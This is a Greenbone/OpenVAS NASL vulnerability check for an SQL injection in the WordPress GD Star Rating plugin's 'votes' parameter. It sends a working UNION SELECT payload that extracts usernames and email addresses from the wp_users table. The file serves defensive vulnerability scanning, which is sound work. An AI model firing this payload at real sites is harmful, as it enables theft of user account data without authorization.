# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802204");
  script_version("2023-07-28T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-07-28 05:05:23 +0000 (Fri, 28 Jul 2023)");
  script_tag(name:"creation_date", value:"2011-06-13 15:28:04 +0200 (Mon, 13 Jun 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("WordPress GD Star Rating Plugin 'votes' Parameter SQL Injection Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");

  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/102095/wpstarrating-sql.txt");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/48166");
  script_xref(name:"URL", value:"http://downloads.securityfocus.com/vulnerabilities/exploits/48166.txt");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to cause SQL Injection
  attack and gain sensitive information.");

  script_tag(name:"affected", value:"WordPress GD Star Rating Plugin version 1.9.8 and prior.");

  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied input
  passed via the 'votes' parameter to /wp-content/plugins/gd-star-rating/ajax.php,
  which allows attacker to manipulate SQL queries by injecting arbitrary SQL code.

  *****
  NOTE: The exploit will work only when nonce is disabled, by default it is enabled.
  *****");

  script_tag(name:"summary", value:"WordPress GD Star Rating Plugin is prone to an SQL injection (SQLi) vulnerability.");

  script_tag(name:"solution", value:"Update to GD Star Rating Plugin version 1.9.9.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/gd-star-rating/");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

vtstrings = get_vt_strings();

url = string(dir,"/wp-content/plugins/gd-star-rating/ajax.php?vote_type=cache",
             "&vote_domain=a&votes=asr.1.xxx.1.2.5+limit+0+union+select+1,",
             "0x535242,1,1,concat(0x613a313a7b733a363a226e6f726d616c223b733a3",
             "23030303a22,substring(concat((select+concat(0x",vtstrings["default_hex"],
             ",0x3a,user_nicename,0x3a,user_email,0x3a,user_login,0x3a,",vtstrings["default_hex"],
             ")+from+wp_users+where+length(user_pass)>0+order+by+id+",
             "limit+0,1),repeat(0x20,2000)),1,2000),0x223b7d),1,1,1+limit+1");

if(http_vuln_check(port:port, url:url, check_header:TRUE, pattern:">" + vtstrings["default"] + ":(.+):(.+):(.+):" + vtstrings["default"])) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
